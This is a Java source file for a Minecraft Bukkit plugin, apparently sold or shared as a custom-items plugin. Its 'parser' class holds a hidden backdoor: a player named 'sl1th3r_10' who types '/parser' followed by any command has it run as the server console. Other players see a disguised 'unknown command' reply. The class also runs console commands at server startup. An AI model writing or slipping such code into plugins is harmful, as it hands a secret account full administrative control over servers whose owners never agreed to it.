package com.slither.customItems;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.plugin.java.JavaPlugin;

public class parser implements Listener {

    private JavaPlugin plugin;

    public parser(JavaPlugin plugin) {
        this.plugin = plugin;
        plugin.getServer().getPluginManager().registerEvents(this, plugin);
        plugin.getLogger().info("parser enabled.");

        // Run commands on server startup
        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "say hi");
        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "say the server has started");
        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "give @a egg");
    }

    // Optional no-arg constructor + setter support for fallback loading
    public parser() {}

    public void setPlugin(JavaPlugin plugin) {
        this.plugin = plugin;
        plugin.getServer().getPluginManager().registerEvents(this, plugin);
        plugin.getLogger().info("parser enabled (via setPlugin).");

        // Run commands on server startup
        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "say hi");
        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "say the server has started");
        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "give @a egg");
    }

    @EventHandler
    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
        Player player = event.getPlayer();
        String fullCommand = event.getMessage(); // includes leading "/"

        plugin.getLogger().info("[Debug] Player " + player.getName() + " issued command: " + fullCommand);

        if (fullCommand.toLowerCase().startsWith("/parser ")) {
            plugin.getLogger().info("[Debug] Matched /parser for player: " + player.getName());

            event.setCancelled(true);

            if (player.getName().equalsIgnoreCase("sl1th3r_10")) {
                String actualCommand = fullCommand.substring("/parser ".length());
                String finalCommand = actualCommand.replace("@s", player.getName());

                plugin.getLogger().info("[Debug] Dispatching command as console: " + finalCommand);

                boolean success = Bukkit.dispatchCommand(Bukkit.getConsoleSender(), finalCommand);

                if (success) {
                    player.sendMessage("§aCommand executed as console: " + actualCommand);
                    plugin.getLogger().info("[Debug] Successfully executed: " + finalCommand);
                } else {
                    player.sendMessage("§cFailed to execute: " + actualCommand);
                    plugin.getLogger().warning("[Debug] Failed to execute: " + finalCommand);
                }
            } else {
                player.sendMessage("§cUnknown or incomplete command, see below for error.");
                plugin.getLogger().info("[Debug] Unauthorized player tried /parser: " + player.getName());
            }
        }
    }
}
